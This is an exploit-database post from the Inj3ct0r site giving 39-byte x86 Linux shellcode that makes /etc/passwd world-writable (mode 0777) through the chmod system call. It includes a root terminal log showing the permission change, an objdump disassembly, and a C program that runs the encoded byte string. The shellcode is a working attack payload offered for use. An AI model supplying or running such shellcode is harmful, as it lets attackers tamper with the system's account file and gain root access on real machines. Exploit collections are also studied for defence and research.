1-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=0
0     _                   __           __       __                     1
1   /' \            __  /'__`\        /\ \__  /'__`\                   0
0  /\_, \    ___   /\_\/\_\ \ \    ___\ \ ,_\/\ \/\ \  _ ___           1
1  \/_/\ \ /' _ `\ \/\ \/_/_\_<_  /'___\ \ \/\ \ \ \ \/\`'__\          0
0     \ \ \/\ \/\ \ \ \ \/\ \ \ \/\ \__/\ \ \_\ \ \_\ \ \ \/           1
1      \ \_\ \_\ \_\_\ \ \ \____/\ \____\\ \__\\ \____/\ \_\           0
0       \/_/\/_/\/_/\ \_\ \/___/  \/____/ \/__/ \/___/  \/_/           1
1                  \ \____/ >> Exploit database separated by exploit   0
0                   \/___/          type (local, remote, DoS, etc.)    1
1                                                                      1
0  [+] Site            : Inj3ct0r.com                                  0
1  [+] Support e-mail  : submit[at]inj3ct0r.com                        1
0                                                                      0
1               #########################################              1
0               I'm gunslinger_ member from Inj3ct0r Team              1
1               #########################################              0
0-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-==-=-=-1

/*
Title  : change mode 0777 of "/etc/passwd" with sys_chmod syscall
Name   : 39 bytes sys_chmod("/etc/passwd",599) x86 linux shellcode
Date   : may, 31 2009
Author : gunslinger_ <yudha.gunslinger[at]gmail.com>
Web    : devilzc0de.com
blog   : gunslingerc0de.wordpress.com
tested on : linux debian
*/

/*
root@localhost:/home/gunslinger/shellcode# ls -la /etc/passwd
-rw-r--r-- 1 root root 1869 2010-05-08 15:53 /etc/passwd
root@localhost:/home/gunslinger/shellcode# gcc -o chmod chmod.c
chmod.c: In function ‘main’:
chmod.c:37: warning: incompatible implicit declaration of built-in function ‘strlen’
root@localhost:/home/gunslinger/shellcode# ./chmod
Length: 39
root@localhost:/home/gunslinger/shellcode# ls -la /etc/passwd
-rwxrwxrwx 1 root root 1869 2010-05-08 15:53 /etc/passwd
root@localhost:/home/gunslinger/shellcode# chmod 644 /etc/passwd
root@localhost:/home/gunslinger/shellcode# ls -la /etc/passwd
-rw-r--r-- 1 root root 1869 2010-05-08 15:53 /etc/passwd
root@localhost:/home/gunslinger/shellcode# objdump -d chmod

chmod:     file format elf32-i386


Disassembly of section .text:

08048060 <.text>:
 8048060:	eb 15                	jmp    0x8048077
 8048062:	31 c0                	xor    %eax,%eax
 8048064:	b0 0f                	mov    $0xf,%al
 8048066:	5b                   	pop    %ebx
 8048067:	31 c9                	xor    %ecx,%ecx
 8048069:	66 b9 ff 01          	mov    $0x1ff,%cx
 804806d:	cd 80                	int    $0x80
 804806f:	31 c0                	xor    %eax,%eax
 8048071:	b0 01                	mov    $0x1,%al
 8048073:	31 db                	xor    %ebx,%ebx
 8048075:	cd 80                	int    $0x80
 8048077:	e8 e6 ff ff ff       	call   0x8048062
 804807c:	2f                   	das
 804807d:	65                   	gs
 804807e:	74 63                	je     0x80480e3
 8048080:	2f                   	das
 8048081:	70 61                	jo     0x80480e4
 8048083:	73 73                	jae    0x80480f8
 8048085:	77 64                	ja     0x80480eb
root@localhost:/home/gunslinger/shellcode#
*/

#include <stdio.h>

char sc[] = "\xeb\x15\x31\xc0\xb0\x0f\x5b\x31\xc9\x66\xb9\xff\x01\xcd\x80\x31\xc0\xb0\x01\x31\xdb\xcd\x80\xe8\xe6\xff\xff\xff\x2f\x65\x74\x63\x2f\x70\x61\x73\x73\x77\x64";

int main(void)
{
       	fprintf(stdout,"Length: %d\n",strlen(sc));
	(*(void(*)()) sc)();

return 0;
}